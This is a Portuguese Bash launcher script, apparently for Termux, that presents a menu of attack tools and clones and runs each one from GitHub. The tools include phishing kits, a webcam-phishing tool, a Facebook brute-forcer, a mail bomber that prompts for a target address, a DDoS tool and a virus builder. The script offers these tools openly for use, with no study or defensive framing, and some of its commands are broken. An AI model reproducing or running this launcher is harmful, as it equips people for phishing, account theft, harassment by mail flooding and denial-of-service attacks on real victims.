#!/bin/bash

# Cores
RED='\033[31;1m'
GREEN='\033[32;1m'
YELLOW='\033[33;1m'
BLUE='\033[34;1m'
NC='\033[0m'

# Criar diretório Tools se não existir
if [ ! -d "Tools" ]; then
    mkdir Tools
fi

# Função para atualizar e instalar pacotes necessários
instalar_dependencias() {
    echo -e "${YELLOW}Instalando dependências...${NC}"
    sleep 2
    apt update && apt upgrade -y
    pkg install git python python3 curl -y
    echo -e "${GREEN}Instalação concluída.${NC}"
}

# Função para baixar e executar uma ferramenta
baixar_e_executar() {
    local nome=$1
    local repo=$2
    local comando=$3

    echo -e "${YELLOW}Instalando ${nome}...${NC}"
    sleep 2
    cd Tools
    git clone "$repo"
    cd "$(basename "$repo" .git)"
    eval "$comando"
}

# Exibir menu
while true; do
    clear
    echo -e "${RED}
    ███████╗██╗  ██╗███████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗
    ██╔════╝██║  ██║██╔════╝██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
    ███████╗███████║█████╗  ███████║       ██║   ██║   ██║██║   ██║██║
    ██║╚════██╔══██║██╔══╝  ██╔══██║       ██║   ██║   ██║██║   ██║██║
    ███████║██║  ██║███████╗██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
    ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ v1
     Coded by Anonymous-Silva
     github: https://github.com/Anonymous-Silva
${NC}"


    echo -e "${WHITE}[1]${CYAN} Instalar Dependências e Atualizar"
    echo -e "${WHITE}[2]${CYAN} Phishing Tool"
    echo -e "${WHITE}[3]${CYAN} WebCam Hack"
    echo -e "${WHITE}[4]${CYAN} Subscan"
    echo -e "${WHITE}[5]${CYAN} Gmail Bomber"
    echo -e "${WHITE}[6]${CYAN} DDOS Attack"
    echo -e "${WHITE}[7]${CYAN} Como Usar?"
    echo -e "${WHITE}[8]${CYAN} Remover Ferramentas"
    echo -e "${WHITE}[9]${CYAN} IP Info"
    echo -e "${WHITE}[10]${CYAN} Dorks-eye"
    echo -e "${WHITE}[11]${CYAN} HackerPro"
    echo -e "${WHITE}[12]${CYAN} RED_HAWK"
    echo -e "${WHITE}[13]${CYAN} VirusCrafter"
    echo -e "${WHITE}[14]${CYAN} Info-Site"
    echo -e "${WHITE}[15]${CYAN} BadMod"
    echo -e "${WHITE}[16]${CYAN} Facebash"
    echo -e "${WHITE}[17]${CYAN} DARKARMY"
    echo -e "${WHITE}[18]${CYAN} AUTO-IP-CHANGER"

    # Solicitar escolha do usuário
    read -p "Escolha uma opção: " opcao

    case $opcao in
        1)
            clear
            echo -e "${CYAN} Instalando dependências e atualizando...${NC}"
            sleep 2
            pkg install git -y
            pkg install python python3 -y
            pkg install pip pip3 -y
            pkg install curl -y
            apt update && apt upgrade -y
            echo -e "${CYAN} Atualização concluída!${NC}"
            sleep 2
            ;;
        2)
            clear
            echo -e "${CYAN} Instalando Phishing Tool...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/htr-tech/zphisher
            cd zphisher
            bash zphisher.sh
            ;;
        3)
            clear
            echo -e "${CYAN} Instalando WebCam Hack...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/techchipnet/CamPhish
            cd CamPhish
            bash camphish.sh
            ;;
        4)
            clear
            echo -e "${CYAN} Instalando Subscan...${NC}"
            sleep 2
            git clone https://github.com/zidansec/subscan
            cd subscan
            read -p "Digite um domínio (ex: example.com): " sc
            ./subscan $sc
            ;;
        5)
            clear
            echo -e "${CYAN} Instalando Gmail Bomber...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/juzeon/fast-mail-bomber.git
            cd fast-mail-bomber/
            mv config.example.php config.php
            php index.php update-providers
            echo -e "${CYAN} Preparando para bombardeio de e-mail...${NC}"
            read -p "Digite o e-mail alvo: " mail
            php index.php start-bombing $mail
            ;;
        6)
            clear
            echo -e "${CYAN} Instalando DDOS Attack...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/palahsu/DDoS-Ripper.git
            cd DDoS-Ripper
            python3 DRipper.py
            ;;
        7)
            clear
            echo -e "${CYAN} Tutorial em vídeo: https://www.youtube.com/watch?v=zgdq6ErscqY${NC}"
            sleep 2
            ;;
        8)
            clear
            echo -e "${CYAN} Removendo todas as ferramentas...${NC}"
            sleep 2
            rm -rf Tools
            ;;
        9)
            clear
            echo -e "${CYAN} Instalando IP Info...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/htr-tech/track-ip.git
            cd track-ip
            bash trackip
            ;;
        10)
            clear
            echo -e "${CYAN} Instalando Dorks-eye...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/BullsEye0/dorks-eye.git
            cd dorks-eye
            pip install -r requirements.txt
            python3 dorks-eye.py
            ;;
        11)
            clear
            echo -e "${CYAN} Instalando HackerPro...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/jaykali/hackerpro.git
            cd hackerpro
            bash install.sh
            python2 hackerpro.py
            ;;
        12)
            clear
            echo -e "${CYAN} Instalando RED_HAWK...${NC}"
            sleep 2
            cd Tools
            git clone https://github.com/Tuhinshubhra/RED_HAWK
            cd RED_HAWK
            php rhawk.php
            ;;
            

	13)
	    clear
	    echo -e "${CYAN} Instalando TigerVirus...${NC}"
	    cd Tools
	    git clone https://github.com/Devil-Tigers/TigerVirus
       	    apt update
	    apt upgrade -y
            pkg install git -y
	    cd TigerVirus
	    bash app.sh
	    ;;
	
	14)
	    clear	
	    echo -e "${CYAN} Instalando info-site...${NC}"
	    cd Tools
	    pkg install curl -y
	    upgrade -y
	    pkg install git -y
	    git clone https://github.com/king-hacking/info-site.git
	    cd info-site
	    bash info.sh
	    ;;
	    
	15)
	    clear
	    echo -e "${CYAN} Instalando BadMod...${NC}"
	    sleep 3
	    cd Tools
	    sudo apt-get update
	    sudo apt-get install php -y
	    sudo apt-get install php-curl -y
	    git clone https://github.com/MrSqar-Ye/BadMod.git
	    cd BadMod
	    chmod u+x INSTALL
	    chmod u+x BadMod.php
	    sudo php BadMod.php
	     ;;
	
	16)
	     clear
	    echo -e "${CYAN} Instalando Facebash...${NC}"
	    sleep 3
	    cd Tools
	    git clone https://github.com/fu8uk1/facebash
	    cd facebash
	    bash install.sh
	    chmod +x facebash.sh
	    tor
	    sudo ./facebash.sh
	     ;;
	
	17)
	    clear
	    echo -e "${CYAN} Instalando DARKARMY...${NC}"
	    sleep 3
	    cd Tools
	    pkg install git -y
	    pkg install python2 -y
	    apt install git -y
	    apt install python2 -y
	    git clone https://github.com/D4RK-4RMY/DARKARMY
	    cd DARKARMY
	    chmod +x darkarmy.py
	    python2 darkarmy.py
	    	;;

        18)
            clear
            echo -e "${CYAN} Instalando AUTO-IP-CHANGER...${NC}"
            sleep 2
            cd Tools
            sudo apt-get install tor
            pip3 install requests
            git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
            cd Auto_Tor_IP_changer
            python3 install.py
            aut
            ;;
        *)
            echo -e "${RED} Opção inválida! Tente novamente.${NC}"
            sleep 2
            ;;
    esac
done
